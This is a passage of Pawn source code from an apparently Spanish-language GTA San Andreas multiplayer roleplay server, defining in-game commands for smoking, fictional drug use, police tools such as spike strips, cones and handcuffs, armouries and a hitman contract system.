	        A_Format(Str,"Ibupìrac x 400\t"#CVERDE"(%d)\nIbupìrac x 600\t"#CVERDE"(%d)",InfoJugador[playerid][jIbu400],InfoJugador[playerid][jIbu600]);
			Dialog(playerid,dTomarMed,DIALOG_STYLE_LIST,"Tomar medicamentos",Str,"Aceptar","Cancelar");
			return 1;
		}
		else if(!strcmp(params, "televisor", true))
		{
			Loop(i, sizeof InfoTV, 0)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 2.0, InfoTV[i][tvPos][0], InfoTV[i][tvPos][1], InfoTV[i][tvPos][2]))
			    {
			        AutoRol(playerid, "Comienza a ver la televisión");
			        ActualizarCuenta(playerid);
			        
					new
					    Float:x, Float:y, Float:z;
					GetPlayerPos(playerid, x, y, z);

					SetPVarFloat(playerid, "TV_x", x);
					SetPVarFloat(playerid, "TV_y", y);
					SetPVarFloat(playerid, "TV_z", z);
					SetPVarInt(playerid, "TV_int", GetPlayerInterior(playerid) );
					SetPVarInt(playerid, "TV_vw", GetPlayerVirtualWorld(playerid) );

			        SetPlayerVirtualWorld(playerid, 0);
					TogglePlayerSpectating(playerid, true);
			        SetPVarInt(playerid, "VIENDO_TV",1);
					SetPVarInt(playerid,"TV_ID",i);
					MostrarTV(playerid, CANAL_LSTV);
					SelectTextDraw(playerid, C_ROJO);
					
					
				    Mensaje(playerid,-1,"Cuando quiera dejar de usar la televisión, use "#CINFO"/dejar televisor");
					if(!GetPVarInt(playerid, "T_DATOS"))
					{
					    cmd_datos(playerid, "no_msg");
					}
					if(!InfoTV[i][tvPrendida])
					{
					    TextDrawShowForPlayer(playerid, TV_Apagado);
					}
					MostrarTDTV(playerid);
					return 1;
				}
			}
			return Error(playerid, "Aquí no hay ningún televisor.");
		}
		else if(!strcmp(params, "bidon", true))
		{
			NeedObject(playerid)<OBJ_BIDON>;
			if(!IsPlayerInAnyVehicle(playerid)) return Error(playerid, "¡Debes estar en un vehículo!");
			new
			    VehID = GetPlayerVehicleID(playerid);

			VGas[VehID] = (VGas[VehID]+10 < 100) ? VGas[VehID]+10 : 100;
			AutoRol(playerid, "coloca 10L. de combustible en un vehículo");
			RemovePlayerObject(playerid, OBJ_BIDON);
			return 1;
		}

		return ParamsINC(playerid,"/usar <ITEM>");
	}

	CMD:fumar(playerid,params[])
	{
		if(!strcmp(params,"cigarrillo",true))
		{
	  		if(!InfoJugador[playerid][jCigarrillos]) return Error(playerid,"¡No tienes cigarrillos!");
		    if(!InfoJugador[playerid][jEncendedor]) return Error(playerid,"¡No tienes encendedor!");
			if(GetPVarInt(playerid,"FUMANDO")) return Error(playerid,"¡Ya estas fumando!");
		    AutoRol(playerid,"enciende su cigarrillo con un encendedor");
		    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_SMOKE_CIGGY);
		    InfoJugador[playerid][jCigarrillos] --;
		    SetPVarInt(playerid,"FUMANDO",1);
		    new Str[90];
			A_Format(Str,"Prendiste un cigarrillo. Ahora, te quedan %d "#CINFO"(/dfumar para tirar el cigarrillo)",InfoJugador[playerid][jCigarrillos]);
			Mensaje(playerid,-1,Str);
			return 1;
		}
		else if(!strcmp(params,"faso",true))
		{
		    if(!InfoJugador[playerid][jFasos]) return Error(playerid,"¡No tenes fasos!");
		    if(!InfoJugador[playerid][jEncendedor]) return Error(playerid,"¡No tienes encendedor!");
			if(GetPVarInt(playerid,"FUMANDO")) return Error(playerid,"¡Ya estas fumando!");
			AutoRol(playerid,"prende un faso, y lo empieza a fumar");
	        Drogarse(playerid,DROGA_MARIHUANA);
		    InfoJugador[playerid][jFasos] --;
		    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_SMOKE_CIGGY);
		    SetPVarInt(playerid,"FUMANDO",1);
		    new Str[90];
			A_Format(Str,"Prendiste un faso. Ahora, te quedan %d "#CINFO"(/dfumar para tirar el faso)",InfoJugador[playerid][jFasos]);
			Mensaje(playerid,-1,Str);
			return 1;
		}
		return ParamsINC(playerid,"/fumar <faso/cigarrillo>");
	}

	CMD:hacer(playerid,params[])
	{
	    if(!strcmp(params,"faso",true))
	    {
	        if(!InfoJugador[playerid][jSeda]) return Error(playerid,"¡No tienes seda!");
	        if(!InfoJugador[playerid][jDroga][DROGA_MARIHUANA]) return Error(playerid,"¡No tienes marihuana!");
			InfoJugador[playerid][jDroga][DROGA_MARIHUANA] --;
			InfoJugador[playerid][jSeda] --;
			InfoJugador[playerid][jFasos] ++;
			AutoRol(playerid,"se hace un faso, con seda y marihuana");
			return 1;
		}
		return ParamsINC(playerid,"/hacer <faso>");
	}

	CMD:consumir(playerid,params[])
	{
	    if(!strcmp(params,"cocaina",true))
	    {
	        if(!InfoJugador[playerid][jDroga][DROGA_COCAINA]) return Error(playerid,"¡No tienes cocaina!");
	        Drogarse(playerid,DROGA_COCAINA);
			return 1;
		}
	    else if(!strcmp(params,"heroina",true))
	    {
	        if(!InfoJugador[playerid][jDroga][DROGA_HEROINA]) return Error(playerid,"¡No tienes heroina!");
	        Drogarse(playerid,DROGA_HEROINA);
			return 1;
		}
  		else if(!strcmp(params,"opio",true))
	    {
	        if(!InfoJugador[playerid][jDroga][DROGA_OPIO]) return Error(playerid,"¡No tienes opio!");
	        Drogarse(playerid,DROGA_OPIO);
			return 1;
		}
	    else if(!strcmp(params,"cannabis",true))
	    {
	        if(!InfoJugador[playerid][jDroga][DROGA_CANNABIS]) return Error(playerid,"¡No tienes cannabis!");
	        Drogarse(playerid,DROGA_CANNABIS);
			return 1;
		}
		return ParamsINC(playerid,"/consumir <cocaina/heroina/opio/cannabis>");
	}

	CMD:crearpincharuedas(playerid, params[])
	{
		if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid, "¡No eres policia/militar!");
		if(IsPlayerInAnyVehicle(playerid)) return Error(playerid, "¡No puedes poner un pincharuedas estando en un vehículo!");
	    new
			Float:p[4];

	    GetPlayerPos(playerid, p[0], p[1], p[2]);
	    GetPlayerFacingAngle(playerid, p[3]);
		p[2] -= 1.0;
		if(CrearPinchaRuedas(p[0], p[1], p[2], p[3]) == -1) return Error(playerid, "¡No se pueden crear más pincharuedas!");
		GameTextForPlayer(playerid, "~w~pincharuedas ~g~creado", 3000, 3);
	    return 1;
	}

	CMD:borrarpincharuedas(playerid,params[])
	{
		if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid, "¡No eres policia/militar!");
		if(IsPlayerInAnyVehicle(playerid)) return Error(playerid, "¡No puedes borrar un pincharuedas estando en un vehículo!");
		for(new i; i < sizeof(PinchaRuedas); i++)
		{
		    new
		        Float: p[3];

			GetDynamicObjectPos(PinchaRuedas[i], p[0], p[1], p[2]);
			if(GetPlayerDistanceFromPoint(playerid, p[0], p[1], p[2]) < 5.0)
			{
			    DestroyDynamicObject(PinchaRuedas[i]);
			    PinchaRuedas[i] = INVALID_OBJECT_ID;
			    DestroyDynamicPickup(PICK_PinchaRuedas[i][0]);
			    DestroyDynamicPickup(PICK_PinchaRuedas[i][1]);
			    PICK_PinchaRuedas[i][0] = 0;
			    PICK_PinchaRuedas[i][1] = 0;
				GameTextForPlayer(playerid,"~w~pincharuedas ~r~borrado",3000,3);
			    return 1;
			}
		}
		return Error(playerid, "No se encontró ningún ~b~~h~pincharuedas~w~ al lado tuyo.");
	}

stock CrearPinchaRuedas(Float:x, Float:y, Float:z, Float:Angle)
{
	new
	    Slot = -1,
		Float: Area[2], Float: Angle2;

	for(new i; i < sizeof(PinchaRuedas); i++)
	{
	    if(PinchaRuedas[i] == INVALID_OBJECT_ID)
	    {
	        Slot = i;
	        break;
		}
	}

	if(Slot == -1) return -1;

 	PinchaRuedas[Slot] = CreateDynamicObject(2892, x, y, z, 0, 0, Angle+90.0);
	// --------------------------
	Angle2 = Angle-90.0;
	Area[0] = x + (2.4 * floatsin(-Angle2, degrees));
	Area[1] = y + (2.4 * floatcos(-Angle2, degrees));
	PICK_PinchaRuedas[Slot][0] = CreateDynamicPickup(19300, 14, Area[0], Area[1], z+1.0);
	// --------------------------
	Angle2 = Angle+90.0;
	Area[0] = x + (2.4 * floatsin(-Angle2, degrees));
	Area[1] = y + (2.4 * floatcos(-Angle2, degrees));
	PICK_PinchaRuedas[Slot][1] = CreateDynamicPickup(19300, 14, Area[0], Area[1], z+1.0);
	// --------------------------
	return 1;
}


	CMD:crearcono(playerid,params[])
	{
		if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid,"¡No eres policia/militar!"),1;
		if(IsPlayerInAnyVehicle(playerid)) return Error(playerid, "¡No puedes poner un cono estando en un vehículo!");

		new
		    Slot = -1;
		for(new i; i < sizeof(Cono); i++)
		{
		    if(Cono[i] == INVALID_OBJECT_ID)
		    {
		        Slot = i;
		        break;
			}
		}

		if(Slot == -1) return Error(playerid,"¡No puedes poner más conos!");
		new
			Float:CheckPos[4];
		GetPlayerPos(playerid,CheckPos[0],CheckPos[1],CheckPos[2]);
		GetPlayerFacingAngle(playerid,CheckPos[3]);
		Cono[Slot] = CreateDynamicObject(1238, CheckPos[0], CheckPos[1], CheckPos[2]-0.7, 0.0, 0.0, CheckPos[3]+180);
		GameTextForPlayer(playerid,"~w~Cono ~g~creado",3000,3);
		return 1;
	}

	CMD:borrarcono(playerid,params[])
	{
		if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid, "¡No eres policia/militar!");
		if(IsPlayerInAnyVehicle(playerid)) return Error(playerid, "¡No puedes borrar un cono estando en un vehículo!");

		for(new i; i < sizeof(Cono); i++)
		{
		    new
		        Float: p[3];

			GetDynamicObjectPos(Cono[i], p[0], p[1], p[2]);
			if(GetPlayerDistanceFromPoint(playerid, p[0], p[1], p[2]) < 1.0)
			{
			    DestroyDynamicObject(Cono[i]);
			    Cono[i] = INVALID_OBJECT_ID;
				GameTextForPlayer(playerid,"~w~Cono ~r~borrado",3000,3);
			    return 1;
			}
		}
		return Error(playerid, "No se encontró ningún ~r~~h~~h~cono ~w~al lado tuyo.");
	}

	CMD:borrarconos(playerid,params[])
	{
		if(Staff(playerid,Mod.Superior)) return 1;
		
		new
			Float:radio;
			
		if(sscanf(params, "f", radio)) return ParamsINC(playerid, "/borrarconos [Radio]");

		for(new i; i < sizeof(Cono); i++)
		{
		    new
		        Float: p[3];

			GetDynamicObjectPos(Cono[i], p[0], p[1], p[2]);
			if(GetPlayerDistanceFromPoint(playerid, p[0], p[1], p[2]) < radio)
			{
			    DestroyDynamicObject(Cono[i]);
			    Cono[i] = INVALID_OBJECT_ID;
			    return 1;
			}
		}
		return 1;
	}

	CMD:acoche(playerid,params[])
	{
		new SCoche[156];
		if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid,"¡No eres policia/militar!"),1;
		Comando_En_Auto
		if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/acoche [ ID/NOMBRE ]"),1;
		if(!IsPlayerConnected(params[0])) return Error(playerid,"Está desconectado!"),1;
		if(IsPlayerInAnyVehicle(params[0])) return Error(playerid,"No puedes forzar a un jugador que está en un auto"),1;
	 	if(!ProxDetectorS(8.0,playerid,params[0])) return Error(playerid,"¡Ese jugador está demasiado lejos!");
		Loop(i, sizeof(Camillas), 0)
		{
			if(InfoCamilla[i][camiUsadaPor] == params[0])
			{
				return Error(playerid,"No puedes subirlo a el, está usando una camilla.");
			}
		}
		PutPlayerInVehicle(params[0],GetPlayerVehicleID(playerid),1);
		format(SCoche,sizeof(SCoche),"sube a %s al vehículo a la fuerza",NombreJugador(params[0]));
		AutoRol(playerid,SCoche);
		SetPVarInt(params[0],"FORZADO_COCHE",1);
		Mensaje(playerid,C_INFO,"Éste jugador está forzadamente en un vehículo, no podrá salir del mismo");
		Mensaje(playerid,C_INFO,"Recuerda, que cuando quieras bajar al jugador del vehículo, usa "#CBLANCO"/scoche [ ID ]");
	 	return 1;
	}

	CMD:scoche(playerid,params[])
	{
		new SCoche[156];
		if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid,"¡No eres policia/militar!"),1;
		if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/scoche [ ID/NOMBRE ]"),1;
		if(!IsPlayerConnected(params[0])) return Error(playerid,"Está desconectado!"),1;
		if(!IsPlayerInAnyVehicle(params[0])) return Error(playerid,"Ese jugador, no está en un vehículo!"),1;
	 	if(!ProxDetectorS(8.0,playerid,params[0])) return Error(playerid,"¡Ese jugador está demasiado lejos!");
		RemovePlayerFromVehicle(params[0]);
		format(SCoche,sizeof(SCoche),"baja del vehículo a %s a la fuerza",NombreJugador(params[0]));
		AutoRol(playerid,SCoche);
		DeletePVar(params[0],"FORZADO_COCHE");
	 	return 1;
	}

	CMD:verarmas(playerid,params[])
	{
		if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid,"¡No eres policia/militar!"),1;
		if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/verarmas [ID/NOMBRE]");
		if(!IsPlayerConnected(params[0])) return Error(playerid, "¡Jugador desconectado!");
		if(params[0] == playerid) return Error(playerid,"¡No puedes revisarte a ti mismo!");
	 	if(!ProxDetectorS(3.0,playerid,params[0])) return Error(playerid,"¡Ese jugador está demasiado lejos!");

	 	new
			Float: Pos[3];

		GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
		GetPosInFrontOfPlayer(playerid, Pos[0], Pos[1], 1.0);

		if(!IsPlayerInRangeOfPoint(params[0], 1.0, Pos[0], Pos[1], Pos[2])) return Error(playerid, "Debes estar mirando al jugador");

		SetPlayerPos(params[0], Pos[0], Pos[1], Pos[2]);

		PlayerWatchPlayer(playerid, params[0]);
		PlayerWatchPlayer(params[0], playerid);
		SetPlayerArmedWeapon(playerid, 0);

		cmd_rendirme(params[0], "");
		//AnimDelay(playerid, 100, "GRAFFITI", "spraycan_fire", .time = 4000);

		new
			SCoche[60];

		format(SCoche,sizeof(SCoche),"revisa a %s en busca de armas",NombreJugador(params[0]));
		AutoRol(playerid,SCoche);
		GameTextForPlayer(params[0], "~r~REVISADO", 2500, 3);
		MostrarCuenta(playerid,params[0],4);

	 	return 1;
	}

	CMD:verinv(playerid,params[])
	{
		if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid,"¡No eres policia/militar!"),1;
		if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/verinv [ID/NOMBRE]");
		if(!IsPlayerConnected(params[0])) return Error(playerid, "¡Jugador desconectado!");
		if(params[0] == playerid) return Error(playerid,"Para ver tu inventario: ~g~N.");
	 	if(!ProxDetectorS(4.0,playerid,params[0])) return Error(playerid,"¡Ese jugador está demasiado lejos!");
	 	new
			Float: Pos[3];

		GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
		GetPosInFrontOfPlayer(playerid, Pos[0], Pos[1], 1.0);

		if(!IsPlayerInRangeOfPoint(params[0], 1.0, Pos[0], Pos[1], Pos[2])) return Error(playerid, "Debes estar mirando al jugador");

		SetPlayerPos(params[0], Pos[0], Pos[1], Pos[2]);

		PlayerWatchPlayer(playerid, params[0]);
		PlayerWatchPlayer(params[0], playerid);
		SetPlayerArmedWeapon(playerid, 0);

		cmd_rendirme(params[0], "");
		//AnimDelay(playerid, 100, "GRAFFITI", "spraycan_fire");

		new
			SCoche[60];

		format(SCoche,sizeof(SCoche),"revisa a %s",NombreJugador(params[0]));
		AutoRol(playerid,SCoche);
		GameTextForPlayer(params[0], "~r~REVISADO", 2500, 3);
		ShowInv(params[0], playerid);
	 	return 1;
	}

stock AnimDelay(playerid, delay, animlib[], animname[], Float:fDelta=4.0, loop=0, lockx=1, locky=1, freeze=0, time=0, forcesync = 0)
{
	SetTimerEx("ApplyAnimationTimer", delay, false, "issfiiiiii", playerid, animlib, animname, fDelta, loop, lockx, locky, freeze, time, forcesync);
	return 1;
}

CALLBACK: ApplyAnimationTimer(playerid, animlib[], animname[], Float:fDelta, loop, lockx, locky, freeze, time, forcesync)
	return ApplyAnimation(playerid, animlib, animname, fDelta, loop, lockx, locky, freeze, time, forcesync);

	CMD:esposar(playerid,params[])
	{
		if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid,"¡No eres policia/militar!"),1;
		if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/esposar [ ID/NOMBRE ]"),1;
		if(!IsPlayerConnected(params[0])) return Error(playerid,"Está desconectado!"),1;
	 	if(!ProxDetectorS(6.0,playerid,params[0])) return Error(playerid,"¡Ese jugador está demasiado lejos!");
		if(params[0] == playerid) return Error(playerid,"¡No puedes esposarte a ti mismo! ¬¬");
		new SCoche[156];
		AutoRol(playerid,"Saca unas esposas de su cinturón");
		format(SCoche,sizeof(SCoche),"esposa a %s.",NombreJugador(params[0]));
		AutoRol(playerid,SCoche);
		GameTextForPlayer(params[0], "~r~ESPOSADO~n~~w~Ahora no te podras mover", 2500, 3);
		SetPlayerWalkingStyle(params[0], WALK_PED);
		SetPlayerAttachedObject(params[0],SLOT_OBJECTS,19418,6,-0.031999,0.024000,-0.024000,-7.900000,-32.000011,-72.299987,1.115998,1.322000,1.406000);
		SetPlayerSpecialAction(params[0],SPECIAL_ACTION_CUFFED);
		SetPVarInt(params[0],"ESPOSADO",1);
	 	return 1;
	}

	CMD:desesposar(playerid,params[])
	{
		new SCoche[156];
		if(!EsLSPD(playerid) && !EsMilitar(playerid)) return Error(playerid,"¡No eres policia/militar!"),1;
		if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/esposar [ ID/NOMBRE ]"),1;
		if(!IsPlayerConnected(params[0])) return Error(playerid,"Está desconectado!"),1;
	 	if(!ProxDetectorS(6.0,playerid,params[0])) return Error(playerid,"¡Ese jugador está demasiado lejos!");
		if(params[0] == playerid) return Error(playerid,"¡No puedes esposarte a ti mismo! ¬¬");
		format(SCoche,sizeof(SCoche),"le quita las esposas a %s.",NombreJugador(params[0]));
		AutoRol(playerid,SCoche);
		GameTextForPlayer(params[0], "~g~^Esposas quitadas!", 2500, 3);
		SetPlayerWalkingStyle(params[0], InfoJugador[playerid][jEstilo]);
		RemovePlayerAttachedObject(params[0],SLOT_OBJECTS);
		SetPlayerSpecialAction(params[0],SPECIAL_ACTION_NONE);
		DeletePVar(params[0],"ESPOSADO");
	 	return 1;
	}

	CMD:ropero(playerid,params[])
	{
		if(IsPlayerInRangeOfPoint(playerid,4,306.8660,-159.2167,999.5938))//lspd
		{
			if(!EsLSPD(playerid)) return Error(playerid,"¡No eres policia!"),1;
			ShowPlayerDialog(playerid,dRoperoLSPD,DIALOG_STYLE_LIST,""#CBLANCO"Armario de policia",""#CPOSITIVO"Cadete \n"#CPOSITIVO"Oficial\n"#CPOSITIVO"Oficial general\n"#CPOSITIVO"Sargento\n"#CPOSITIVO"Capitán\n"#CPOSITIVO"Comandante\n"#CPOSITIVO"Sub Comisario\n"#CPOSITIVO"Comisario\n"#CPOSITIVO"Jefe general\n"#CPOSITIVO"Mujer policía\n"#CPOSITIVO"Motociclista\n"#CPOSITIVO"Agente SWAT\n"#CPOSITIVO"Agente encubierto\n"#CPOSITIVO"Agente encubierto 2\n"#CPOSITIVO"Agente encubierto 3","Cambiarse","Salir");
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,4,285.9903,-30.4936,1001.5156))//lsem
		{
			if(!EsMilitar(playerid)) return Error(playerid,"No eres militar. ¡No tienes permiso a este ropero!"),1;
			ShowPlayerDialog(playerid,dRoperoLSEM,DIALOG_STYLE_LIST,""#CBLANCO"Ropero",""#CPOSITIVO"Militar\n"#CPOSITIVO"Traje de entrenamiento\n"#CPOSITIVO"Mujer militar\n"#CPOSITIVO"Traje de ceremonia\n"#CPOSITIVO"Detective\n"#CPOSITIVO"Agente encubierto\n"#CPOSITIVO"Agente encubierto 2\n"#CPOSITIVO"Agente encubierto 3\n"#CPOSITIVO"Agente SWAT\n"#CPOSITIVO"Agente de seguridad\n"#CPOSITIVO"Agente de seguridad 2\n"#CPOSITIVO"Piloto","Cambiarse","Salir");
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,2,2558.4216,1259.9790,866.3764))//lsmd
		{
			if(!EsMedico(playerid)) return Error(playerid,"No eres médico. ¡No tienes permiso a este ropero!"),1;
			ShowPlayerDialog(playerid,dRoperoLSMD,DIALOG_STYLE_LIST,""#CBLANCO"Ropero",""#CPOSITIVO"Médico a prueba\n"#CPOSITIVO"Médico\n"#CPOSITIVO"Sub-director\n"#CPOSITIVO"Director","Cambiarse","Salir");
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,2,348.89999390,164.50000000,1013.70001221))
		{
		    if(!EsDelGobierno(playerid)) return Error(playerid,"¡No perteneces al cuerpo gobernamental!");
			ShowPlayerDialog(playerid,dRoperoLSPD,DIALOG_STYLE_LIST,""#CBLANCO"Armario de policia",""#CPOSITIVO"Cadete \n"#CPOSITIVO"Oficial\n"#CPOSITIVO"Oficial general\n"#CPOSITIVO"Sargento\n"#CPOSITIVO"Capitán\n"#CPOSITIVO"Comandante\n"#CPOSITIVO"Sub Comisario\n"#CPOSITIVO"Comisario\n"#CPOSITIVO"Jefe general\n"#CPOSITIVO"Mujer policía\n"#CPOSITIVO"Motociclista\n"#CPOSITIVO"Agente SWAT\n"#CPOSITIVO"Agente encubierto\n"#CPOSITIVO"Agente encubierto 2\n"#CPOSITIVO"Agente encubierto 3","Cambiarse","Salir");
			return 1;
		}
		return Error(playerid,"No estás en un ropero!");
	}

	CMD:armamento(playerid,params[])
	{
	    new armas[580];
		if(IsPlayerInRangeOfPoint(playerid,6,312.7423,-165.5410,999.6010))
		{
			if(!EsLSPD(playerid)) return Error(playerid,"¡No eres policia!"),1;
			strcat(armas,""#CPOSITIVO"Cadete\t\t"#CBLANCO"^ "#CINFO"Cachiporra - 9mm (Tazer)\n");
			strcat(armas,""#CPOSITIVO"Oficial\t\t"#CBLANCO"^ "#CINFO"9mm - mp5 - Escopeta\n");
			strcat(armas,""#CPOSITIVO"SWAT\t\t"#CBLANCO"^ "#CINFO"Granadas humo - mp5 - Escopeta de combate - 9mm\n");
			strcat(armas,""#CPOSITIVO"Encubierto\t"#CBLANCO"^ "#CINFO"Spray - Pistola silenciador\n");
			strcat(armas,""#CPOSITIVO"General\t"#CBLANCO"^ "#CINFO"m4 - 9mm - Cachiporra\n");
			strcat(armas,""#CPOSITIVO"Francotirador\t"#CBLANCO"^ "#CINFO"Sniper - 9mm\n");
			strcat(armas,""#CPOSITIVO"Paracaidista\t"#CBLANCO"^ "#CINFO"Desert - paracaidas");
			ShowPlayerDialog(playerid,dArmeriaLSPD,DIALOG_STYLE_LIST,""#CBLANCO"Armeria "#CAZULCLARO"policial - "#CBLANCO"Seleccione su armamento",armas,"Aceptar","Cancelar");
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,6,349.70001221,160.80000305,1013.70001221))
		{
			if(!EsDelGobierno(playerid)) return Error(playerid,"¡No perteneces al cuerpo gobernamental!"),1;
			strcat(armas,""#CPOSITIVO"Cadete\t\t"#CBLANCO"^ "#CINFO"Cachiporra - Desert - Escopeta\n");
			strcat(armas,""#CPOSITIVO"Oficial\t\t"#CBLANCO"^ "#CINFO"Spray - Desert - mp5\n");
			strcat(armas,""#CPOSITIVO"SWAT\t\t"#CBLANCO"^ "#CINFO"Granada humo - mp5 - Escopeta de combate\n");
			strcat(armas,""#CPOSITIVO"Encubierto\t"#CBLANCO"^ "#CINFO"Spray - Pistola silenciador\n");
			strcat(armas,""#CPOSITIVO"General\t"#CBLANCO"^ "#CINFO"m4 - Deagle\n");
			strcat(armas,""#CPOSITIVO"Francotirador\t"#CBLANCO"^ "#CINFO"Sniper - Pistola silenciador\n");
			strcat(armas,""#CPOSITIVO"Paracaidista\t"#CBLANCO"^ "#CINFO"Desert - paracaidas");
			ShowPlayerDialog(playerid,dArmeriaLSPD,DIALOG_STYLE_LIST,""#CBLANCO"Armeria "#CAZULCLARO"policial - "#CBLANCO"Seleccione su armamento",armas,"Aceptar","Cancelar");
			return 1;
		}

		else if(IsPlayerInRangeOfPoint(playerid,6,294.00000000,-38.09999847,1001.70001221))
		{
			if(!EsMilitar(playerid)) return Error(playerid,"No eres militar. ¡No tienes permiso a recojer estas armas!"),1;
			strcat(armas,""#CPOSITIVO"SWAT\t\t^ "#CINFO"Deagle - M4 - Escopeta combate - MP5 - Granada\n");//100
			strcat(armas,""#CPOSITIVO"Civil\t^ "#CINFO"Deagle\n");//56
			strcat(armas,""#CPOSITIVO"Guerrillero\t^ "#CINFO"Deagle - MP5 - Escopeta - AK47\n");//80
			strcat(armas,""#CPOSITIVO"Alcones\t^ "#CINFO"Deagle - AK47 - MP5 - Granadas - Escopeta - Paracaidas\n");//100
			strcat(armas,""#CPOSITIVO"Incognito\t^ "#CINFO"Pistola silenciador - Bombas a control remoto - M4\n");//100
			strcat(armas,""#CPOSITIVO"Francotirador\t^ "#CINFO"Sniper - Pistola silenciador - MP5\n");//85
			ShowPlayerDialog(playerid,dArmeriaLSEM,DIALOG_STYLE_LIST,""#CPOSITIVO"Armeria Militar",armas,"Aceptar","Cancelar");
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0,331.6000061,175.1999969,1014.2000122))
		{
		    if(!EsHitman(playerid)) return Error(playerid,"No perteneces a hitman.");
		    AutoRol(playerid,"toma el equipo de hitman");
		    Mensaje(playerid,C_INFO, "EQUIPO: "#CBLANCO"Sniper + Pistola 9MM (Silenciador)");
		    ResetPlayerWeapons(playerid);
		    GivePlayerWeapon(playerid, 23, 60);
		    GivePlayerWeapon(playerid, 34, 20);
			return 1;
		}
		return Error(playerid,"¡En este lugar no hay armas!"),1;
	}

	//  HITMAN
	CMD:incognito(playerid,params [])
	{
	    if(!EsHitman(playerid)) return Error(playerid,"¡Solo Hitmans pueden utilizar este comando!");
	    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 329.2000122,177.5000000,1014.2000122)) return Error(playerid,"¡No estás en el ropero!");
		if(sscanf(params,"i", params[0])) return ParamsINC(playerid,"/incognito [ID SKIN]");
		if(params[0] < 1 || params[0] > 299) return Error(playerid,"~g~Minimo: ~w~0~n~~g~Máximo: ~w~299");
		SetPlayerSkin(playerid, params[0]);
		AutoRol(playerid,"se pone ropa de incógnito");
		Mensaje(playerid,-1,"Recuerda que la ropa es temporal, es decir que no la podrás guardar en tu inventario.");
		return 1;
	}

	CMD:encontrar(playerid, params[])
	{
	    if(!EsHitman(playerid)) return Error(playerid,"¡Solo Hitmans pueden utilizar este comando!");
		if(!IsPlayerInRangeOfPoint(playerid, 3.0,374.4480,185.7052,1014.18)) return Error(playerid,"¡No estás en la computadora de hitman!");
		if(sscanf(params,"u", params[0])) return ParamsINC(playerid,"/encontrar [ID/NOMBRE]");
		SetTimerEx("EncontrarJugador", 5000, false, "ii", playerid, params[0]);
		GameTextForPlayer(playerid, "~g~~h~buscando...", 5000, 3);
		CongelarEx(playerid, 5);
		return 1;
	}

	CMD:contrato(playerid, params[])
	{
		if(!IsPlayerInRangeOfPoint(playerid, 2, 320.1897,-1485.6438,24.714)) return Error(playerid,"Debes estar en la calabera para hacer un contrato");

		new
		    ID_Contrato = -1,
			CheckUser[40];

		Loop(i, sizeof InfoContrato, 0)
		{
		    if(!strlen(InfoContrato[i][hitPor]) && !InfoContrato[i][hitDinero])
		    {
		        ID_Contrato = i;
			}
		}

		if(sscanf(params, "is[24]", params[0], params[1])) return ParamsINC(playerid, "/contrato [DINERO] [NOMBRE DE VÍCTIMA (NOMBRE, NO ID)  ]");
		if(params[0] > GetPlayerMoney(playerid)) return Error(playerid, "¡No tienes ese dinero!");
		if(ID_Contrato == -1) return Error(playerid,"No hay más espacio en la agenda, ¡prueba más tarde!");
		if(IsNumeric(params[1]) || TieneNumeros(params[1]) || strfind(params[1], "_") == -1) return Error(playerid,"¡Nombre inválido!");
		if(params[0] < 500 || params[0] > 200000) return Error(playerid,"Minimo $500, máximo $200.000");

		A_Format(CheckUser, U_Archivo, params[1]);

		if(!fexist(CheckUser)) return Error(playerid,"Nombre inexistente");

		QuitarDinero(playerid, params[0]);
		MensajeF(playerid, -1, "Contrataste a los hitman, para que maten a "#CROJO"%s "#CBLANCO"por "#CVERDE"$%d", params[1], params[0]);

		InfoContrato[ID_Contrato][hitDinero] = params[0];
		alm(InfoContrato[ID_Contrato][hitPor], pName(playerid) );
		alm(InfoContrato[ID_Contrato][hitVictima], params[1] );

		AutoRol(playerid, "deja una carta en el buzón");
		ActualizarContratos();
		return 1;
	}


	CMD:contratos(playerid, params[])
	{
	    if(!EsHitman(playerid)) return Error(playerid,"¡Solo Hitmans pueden ver los contratos!");
		if(!IsPlayerInRangeOfPoint(playerid, 3.0,374.4480,185.7052,1014.18)) return Error(playerid,"¡No estás en la computadora de hitman!");

		new Str[(sizeof InfoContrato) * 35], Str2[35];

		Str = "{FFFFFF}";

		Loop(i, sizeof InfoContrato, 0)
		{
		    if(strlen(InfoContrato[i][hitPor]) && InfoContrato[i][hitDinero])
		    {
				A_Format(Str2, "\t• %s ($%d)\n", InfoContrato[i][hitVictima], InfoContrato[i][hitDinero]);
				strcat(Str,Str2);
			}
		}
		Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, ""#CBLANCO"---- "#CVERDE"Contratos Hitman "#CBLANCO"----", Str, "Cerrar", "");
		return 1;
	}

	CMD:cerrarayuntamiento(playerid,params[])
	{
		if(InfoJugador[playerid][jLider] == 1 || InfoJugador[playerid][jLider] == 2)
		{
			if(AyuntaRestringido) return Mensaje(playerid,C_INFO,"¡El ayuntamiento ya está restringido!"),1;
			restriccion1 = CreateDynamicObject(16439,1541.90002441,-1733.40002441,14.19999981,0.00000000,0.00000000,270.00000000); //object(cn2_roadblock04) (1)
